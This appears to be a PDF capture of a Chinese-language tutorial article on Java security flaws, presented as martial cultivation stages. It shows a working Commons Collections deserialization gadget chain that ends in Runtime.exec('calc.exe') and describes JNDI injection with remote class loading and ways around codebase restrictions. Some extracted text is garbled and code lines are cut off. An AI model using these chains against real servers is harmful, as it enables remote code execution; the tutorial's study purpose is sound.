2020/7/27 JAVA基础漏洞是如何⾃我修炼
1 Object[] argss=new Object[]{"getRuntime",null};
2
3 Method mm=(Method)Runtime.class.getClass().getMethod("getMethod", new Cla
4 {String.class,Class[].class}).invoke(Runtime.class, argss);
相当于执⾏了：
1 Method mm=Runtime.class.getMethod("getRuntime", null);
---
1 Runtime rr=(Runtime) mm.getClass().getMethod("invoke", new Class[]
2 {Object.class,Object[].class}).invoke(mm,new Object[] {null,null} );
相当于执⾏了：
1 mm.invoke();
---
1 rr.getClass().getMethod("exec", new Class[] {String.class}).invoke(rr, "c
相当于执⾏了rr.exec("calc"); //rr已经是Runtime对象了，⽽不是Runtime类。
ConstantTransformer在初始化的时候放⼊⾥⾯的⼀个final变量中，transform(任
意Object)都会返回那个变量。
利⽤jd-gui来看⼀下ChainedTransformer的源码。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 8/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
那么就可以利⽤这⼀点，进⾏反射，反射代码如下：
1 Transformer[] transformer=new Transformer[]{
2
3 new ConstantTransformer(Runtime.class),
4
5 new InvokerTransformer("getMethod", new Class[]
6 {String.class,Class[].class},new Object[]{"getRuntime",null}),
7
8 new InvokerTransformer("invoke", new Class[]
9 {Object.class,Object[].class}, new Object[] {null,null}),
10
11 new InvokerTransformer("exec", new Class[] {String.class}, new
12 Object[] {"calc.exe"})
13
14 };
15
16 ChainedTransformer chainedTransformer=new ChainedTransformer(transformer
17
18 chainedTransformer.transform(Object.class);
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 9/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
事实上，前⾯说了ConstantTransformer的特点，所有最后执⾏的Object.class可
以为任何Object，⽐如null，new Object()。
这⾥进⾏调⽤了transform⽅法，如何才能不通过调⽤transform⽅法执⾏反射链呢？
我们就要找到实现本身实现tranform的⽅法。
经过查找发现：
AbstractInputCheckedMapDecorator类下：
TransformedMap类下：
所以我们要控制valueTransformer的值为ChainTransformer对象，找到这个值的赋
值点。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 10/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
所以我们要实现这个链环，就要满⾜基本条件，先
1 Map mp=new HashMap();
2
3 mp.put("ok", "notok"); //为什么赋值是因为要⽤到setValue
4
5 //这⾥decorate是静态⽅法，直接使⽤
6
7 Map dd=TransformedMap.decorate(mp, null, chainedTransformer);
8
9 //⽤过Entry来获取键值对，将Map通过entry放⼊Set集合，然后⽤迭代器迭代
10
11 Map.Entry entry=(Entry) dd.entrySet().iterator().next();
12
13 //更改其中的值，达到⽬标
14
15 entry.setValue("ok");
16
17 //这⾥绕过⿊名单，利⽤已知类的反射链，获取反射的⽅法，最后反射可以利⽤序列化达到⽬的。
⾦丹期--反序列化篇
Java 的序列化是把 Java 的对象转换为jvm可以识别的字节序列的过程，⽅便于存在
⽂件，jvm内存，⽹络的传输等。
常⻅的ObjectOutputStream类的 writeObject() ⽅法可以实现序列化的功能。⽽反
序列化是指把字节序列重新恢复成 Java 对象，反序列化⽤ObjectInputStream 类的
readObject() ⽅法。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 11/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
知知知知知知知知知知知知知知知⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰⼰知知知知知知知知知知知知知知知彼彼彼彼彼彼彼彼彼彼彼彼彼彼彼之之之之之之之之之之之之之之之什什什什什什什什什什什什什什什么么么么么么么么么么么么么么么是是是是是是是是是是是是是是是序序序序序序序序序序序序序序序列列列列列列列列列列列列列列列化化化化化化化化化化化化化化化，，，，，，，，，，，，，，，反反反反反反反反反反反反反反反序序序序序序序序序序序序序序序列列列列列列列列列列列列列列列化化化化化化化化化化化化化化化
结果如下:
这就是序列化和反序列化的过程。
⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦⾦丹丹丹丹丹丹丹丹丹丹丹丹丹丹丹实实实实实实实实实实实实实实实战战战战战战战战战战战战战战战------------------------------反反反反反反反反反反反反反反反序序序序序序序序序序序序序序序列列列列列列列列列列列列列列列化化化化化化化化化化化化化化化漏漏漏漏漏漏漏漏漏漏漏漏漏漏漏洞洞洞洞洞洞洞洞洞洞洞洞洞洞洞示示示示示示示示示示示示示示示例例例例例例例例例例例例例例例
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 12/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
实战结果
很显然在实现⾃⼰的readObject⽅法，反序列化后readObject正好被利⽤，触发恶意
代码。反序列化利⽤的⽅式很多。
JJJJJJJJJJJJJJJNNNNNNNNNNNNNNNDDDDDDDDDDDDDDDIIIIIIIIIIIIIII注注注注注注注注注注注注注注注⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊⼊
已有多位前辈修炼⾄此境界，吾将在此吸取前⼈经验，不便在此过多停留。
JNDI漏洞原理：在lookup参数可控的情况下，我们传⼊Reference类型及其⼦类的对
象，当远程调⽤类的时候默认⾸先会在rmi的服务器中的classpath中去查找，如果不
存在对应的class，就会去提供的url地址去加载类。如果都加载不到的话就会失败。
元婴期实战演练！！！
JNDI这⾥我们先搭建⼀个Registry
Server:
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 13/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
Reference中写好⾃⼰的要执⾏payload的class对象名称，以及对应开启的web服
务，然后绑定在registry中。
ExecTest:
这⾥写⼊⾃⼰payload，我⽤的静态块，⽅便执⾏。
⽤ javac -source 1.5 -target 1.5 ExecTest.java 编 译 成 1.5jdk 版 本 ⽀ 持 的
ExecTest.class字节码⽂件，有⼀些警告信息提示1.5版本在未来版本被移除，忽略
掉。
为了保证是真的成功，要把对应下的bin/ExecTest.class⽂件给删除掉，前⾯说了，
JNDI会先加载本地的class⽂件，所以需要先删除对应的class⽂件，确保是真的远程
加载。
我这⾥把编译的⽂件放⼊D盘，开启Web服务。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 14/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
Client：
启动好Server，运⾏Client，可以看⻅如下：
远程加载ExecTest.class⽂；
成功执⾏命令。
但是看⻅要求必须是1.6以下的版本，后⾯的版本都对其进⾏限制，有限制就有绕过，对
应的，默认不允许从远程的Codebase加载Reference⼯⼚类，就可以添加如下代码，
将
com.sun.jndi.rmi.object.trustURLCodebase;com.sun.jndi.cosnaming.obje
ct.trustURLCodebase两个属性值设置为true。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 15/16
2020/7/27 JAVA基础漏洞是如何⾃我修炼
还有LDAP + JNDI请求LDAP地址来突破限制，利⽤LDAP反序列化执⾏本地Gadget
来绕过等。
⾦丹期修炼时--序列化这⾥，java以rmi（java以rpc为基础的java技术）为根基来衍
⽣更多，⽐如熟悉的EJB，为了使⽤其他语⾔，使⽤Web服务；实现与平台⽆关，⼜使
⽤了SOAP协议。⽽Weblogic在RMI上的实现使⽤了T3协议等等。所以了解RMI，了
解java基础漏洞的⾃我修炼，只有知⼰知彼，才能百战百胜。
修炼永⽆⽌尽，万物皆是如此，需屏⽓凝神⽅能⽐其更为强⼤，以⾄于交⼿时不落于下
⻛。
https://mp.weixin.qq.com/s/OMXrFc7uUN8wGv6yHno3Lg 16/16